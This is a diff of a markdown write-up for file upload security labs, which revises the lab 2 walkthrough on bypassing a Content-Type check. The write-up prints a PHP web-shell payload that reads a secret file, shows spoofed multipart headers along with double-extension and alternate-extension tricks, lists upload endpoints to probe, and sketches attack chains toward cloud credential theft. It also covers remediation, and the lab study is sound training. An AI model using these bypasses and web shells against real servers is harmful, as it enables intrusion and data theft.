@@ -49,7 +49,6 @@ Impact often includes:
 ## 4. Lab Walkthrough (File Upload → Execution)
 
 ### Lab Condition
-
 - Application allows avatar upload
 - Uploaded files are stored inside a **web-accessible directory**
 - No restriction on executable file extensions
@@ -74,9 +73,13 @@ echo file_get_contents('/home/carlos/secret');
 
 ### Attack Flow
 
-1. Login as low-privileged user
-2. Upload `exploit.php` as avatar
-3. Application stores file in:
+1. Go to my accont
+2. Login as low-previleged user
+3. Upload simple .png image to check the flow (Observe POST request)
+4. Click My Acoount option again to trigger GET request as image appears in profile 
+5. Add the MIME type `image` also in Proxy> HTTP history filters (observe GET request reveals file path where image is upload in backend server)
+6. Upload `exploit.php` as avatar/image
+7. Application stores file in:
 
 ```
 /files/avatars/exploit.php
@@ -168,108 +171,293 @@ This makes file upload vulnerabilities **high-impact and critical**.
 > **Final Takeaway:**  
 > File upload vulnerabilities are dangerous not because files are uploaded — but because the server later **executes or processes them**.
 
-# File Upload – Lab 2: Web-shell Upload via Content-Type Restriction Bypass
+---
+
+# ✅Lab-2 File Upload Vulnerability – Flawed File Type Validation (Content-Type Bypass)
 
 ---
 
-## 🔹 Overview
-This lab demonstrates an upload restriction bypass where the application attempts to block non-image uploads by checking the multipart file-part *Content-Type* (and possibly filename).  
-Because Content-Type and filename are client-controllable, an attacker can spoof these values, upload a PHP web shell, execute it, and read sensitive files (e.g., /home/carlos/secret).
+## 1. Overview
+
+File upload vulnerabilities occur when a web application allows users to upload files without properly validating their:
+
+- File type
+- File extension
+- MIME type
+- File content
+- Upload location
+
+If validation is weak or flawed, attackers can upload *server-side executable files* (PHP, JSP, ASP) which may lead to:
+
+- Remote Code Execution (RCE)
+- Sensitive data disclosure
+- Full server compromise
+- Lateral movement
+
+This lab demonstrates a *real-world file upload flaw* where validation exists but relies entirely on a *user-controlled HTTP header*.
 
 ---
 
-## 🔹 Why this matters
-- Relying only on client-supplied headers or filename checks is insecure.  
-- Upload + execution → *remote code execution (RCE)*, data exfiltration, persistence, and full server compromise.  
-- This technique is common in labs and real applications and is often straightforward to exploit.
+## 2. What This Topic Is About
+
+This lab focuses on *flawed file type validation*, specifically:
+
+- The application validates the Content-Type header
+- The Content-Type header is fully attacker-controlled
+- The backend does *not* verify the actual file contents
+
+As a result, an attacker can:
+
+- Upload a PHP file
+- Masquerade it as an image
+- Trigger server-side execution
 
 ---
 
-## 🔹 Lab goal (concise)
-Bypass upload restrictions, upload a PHP web shell, GET the uploaded file, retrieve /home/carlos/secret, and submit the secret.
+## 3. How File Upload Handling Works (Simplified)
+
+When uploading files using multipart/form-data, the request includes:
+
+Content-Disposition: form-data; name="avatar"; filename="shell.php" Content-Type: image/png
+
+🚨 *Critical Mistake*
+
+- Server trusts Content-Type
+- Server does NOT inspect magic bytes
+- Server allows executable extensions
+
+So the server believes:
+
+> “This is an image”
+
+Even though it is *PHP code*.
 
 ---
 
-## 🔹 Methodology / Exact steps
+## 4. Vulnerability Root Cause
 
-1. *Baseline — discover stored path*
-   - Log in (e.g., wiener:peter) with Burp Proxy ON.  
-   - Upload a benign image (avatar) and forward the POST.  
-   - Open the account page and check Burp → Proxy → HTTP history → filter by Images to find the GET the browser made for the stored image.  
-   - Copy the exact stored path (canonical URL) — you will use this later.
+The vulnerability exists because:
 
-2. *Prepare web shell*
-   - Create exploit.php locally with a simple payload:
-     php
-     <?php echo file_get_contents('/home/carlos/secret'); ?>
-     
+- ❌ Validation relies on user-controlled headers
+- ❌ No magic-byte or file signature verification
+- ❌ Executable files allowed in upload directory
+- ❌ Uploaded files are publicly accessible
 
-3. *Intercept a fresh upload POST*
-   - On the upload UI choose exploit.php and click Upload while Burp intercepts.  
-   - Right-click the captured request → *Send to Repeater* (safe place to edit).
-
-4. *Bypass Content-Type / extension checks (edit only the file-part)*
-   Try these techniques in order — stop when one works:
-
-   *A — Change the file-part Content-Type*
-   Content-Disposition: form-data; name="avatar"; filename="exploit.php" Content-Type: image/jpeg
-
-   <?php echo file_get_contents('/home/carlos/secret'); ?>- Keep CSRF and other form fields
-   - Keep CSRF and other form fields unchanged. Forward the request.
-
-*B — Double-extension*
-Content-Disposition: form-data; name="avatar"; filename="exploit.php.jpg" Content-Type: image/jpeg 
-- Forward and check if uploaded as .php.jpg but executed.
-*C — GIF-stub (if magic-bytes checked)*
-?php echo file_get_contents('/home/carlos/secret'); ?>
-*D — Alternate extensions*
-- Try exploit.phtml, exploit.php5, exploit.phar, etc.
-
-5. *Confirm upload & request the shell*
-- If the upload response returns a filename, use it. Otherwise re-open the account page and capture the avatar GET — that reveals the final path including any prefix or renaming.  
-- Send a clean GET to the stored file URL using the same Host and Cookie: session=... headers:
-  
-  GET /files/avatars/exploit.php HTTP/1.1
-  Host: <lab-host>
-  Cookie: session=<session>
-  Accept: */*
-  Connection: close
-  
-- The response should include the secret — copy & submit.
-
-6. *If execution fails*
-- Try different extensions or double-extensions.  
-- If source is returned (no execution), you still gain intelligence; try other upload endpoints or modify the path.  
-- If upload blocked due to CSRF, refresh for a new token and re-capture the POST.
+This is a *classic real-world upload vulnerability*.
 
 ---
 
-## 🔹 Proof of Exploit
-![File Upload Bypass — web shell executed and secret returned](../images/file-upload-lab2-solved.png)  
-(Screenshot shows the GET to the uploaded shell and the returned /home/carlos/secret output — this single image is the clearest proof of successful exploitation.)
+## 5. Impact
+
+Successful exploitation allows attackers to:
+
+- ✔ Read sensitive files (/home/carlos/secret)
+- ✔ Execute arbitrary PHP code
+- ✔ Deploy persistent web shells
+- ✔ Extract credentials
+- ✔ Fully compromise the server
+
+*Severity: Critical*
 
 ---
 
-## 🔹 Troubleshooting quick checks
-- *404 Not Found* → wrong path/prefix or file renamed; use the exact GET captured after benign upload.  
-- *Source returned (no exec)* → server doesn’t execute .php in that directory — try .phtml, double-ext, or GIF stub.  
-- *Upload blocked / CSRF* → refresh the upload page and capture a fresh POST (new token).  
-- *Client-side blocking* → always edit the captured POST in Repeater/Proxy to bypass browser JS checks.
+## 6. Methodology (How to Test in Real Pentests)
+
+Whenever you encounter file upload functionality:
+
+1. Upload a benign file (image)
+2. Observe:
+   - Upload path
+   - Public accessibility
+3. Intercept request in Burp
+4. Modify:
+   - Content-Type
+   - Filename
+5. Trigger execution via GET request
 
 ---
 
-## 🔹 Security Impact
-- Remote code execution → full server takeover.  
-- Exposure of DB credentials, config files, SSH keys → persistent compromise and lateral movement.  
-- Web shell access enables data exfiltration and privilege escalation.
+## 7. LAB WALKTHROUGH (Exact Steps)
+
+### Step 1 — Login
+
+Username: wiener Password: peter
 
 ---
 
-## 🔹 Remediation & best practices
-- Enforce *server-side* validation with an allowlist of safe extensions and MIME types.  
-- Validate file contents (magic bytes) in addition to filename checks.  
-- Store uploaded files *outside* webroot or serve from a separate non-executable domain/subdomain.  
-- Rename uploaded files to safe, non-executable names and remove execute permissions.  
-- Implement AV scanning, size limits, and strict ACLs on uploaded content.
+### Step 2 — Upload Normal Image (Recon)
+
+Uploaded file:
+
+smiley.png
+
+Observed path:
+
+/files/avatars/smiley.png
+
+✔ Files are publicly accessible  
+✔ Served directly by the web server
+
+---
+
+### Step 3 — Prepare PHP Payload
+
+Create file:
+
+exploit.php
+
+Payload:
+
+```php
+<?php
+echo file_get_contents('/home/carlos/secret');
+?>
+```
+
+---
+
+### Step 4 — Intercept Upload Request (Burp)
+
+Original request snippet:
+
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/octet-stream
+
+
+---
+
+### Step 5 — Content-Type Bypass
+
+Modify header to:
+
+Content-Type: image/png
+
+🚨 Filename remains exploit.php
+
+Send request.
+
+---
+
+### Step 6 — Trigger Execution
+
+Navigate back to My Account
+
+Browser loads:
+
+GET /files/avatars/exploit.php
+
+✔ PHP executed
+✔ Secret disclosed
+
+---
+
+### Step 7 — Submit Secret
+
+✔ Lab solved successfully
+
+---
+
+## Evidences/Proof
+
+### 📸 SS-1 — Content-Type Header Manipulation
+
+![content type header bypass](../images/content-type-bypass.png)
+
+### 📸 SS-2 — Carlos Secret Retrieved
+
+![trigger carlos secret](../images/file-upload-lab2-solved.png)
+
+---
+
+## 8. Real-World Scenarios
+
+### Scenario 1 — Avatar Upload → RCE
+
+Upload PHP disguised as image → profile page triggers execution.
+
+### Scenario 2 — Document Upload Abuse
+
+Change Content-Type to application/pdf → upload PHP → execute.
+
+### Scenario 3 — Cloud Credential Theft
+
+Read .env → extract AWS keys → cloud takeover.
+
+### Scenario 4 — CMS Plugin Abuse
+
+Upload malicious plugin disguised as asset → persistent backdoor.
+
+
+---
+
+## 9. High-Value Upload Endpoints
+
+Always test:
+```
+/upload
+/avatar
+/profile/upload
+/files
+/media
+/images
+/assets
+/documents
+/import
+```
+Dangerous when:
+
+Files are executable
+
+Files are publicly accessible
+
+
+
+---
+
+## 10. Multi-Chain Attack Possibilities
+
+### Chain 1
+
+File Upload → Web Shell → DB Credentials → Admin → RCE
+
+### Chain 2
+
+File Upload → .env → Cloud Keys → Cloud Takeover
+
+### Chain 3
+
+File Upload → Source Code Leak → Logic Flaw → Priv Esc
+
+
+---
+
+## 11. Remediation
+
+✔ Validate magic bytes (file signature)
+✔ Enforce strict extension allowlist
+✔ Rename files randomly (UUID)
+✔ Store uploads outside web root
+✔ Disable execution in upload directories
+✔ Never trust Content-Type
+✔ Apply strict filesystem permissions
+
+
+---
+
+## 12. Extra Notes / Pro Tips
+
+Content-Type is never trustworthy
+
+Extensions alone are insufficient
+
+Always test:
+```
+.php
+.php.jpg
+.phtml
+.phar
+```
+
+> If a file can be uploaded and accessed — assume RCE until proven otherwise.
 
 ---
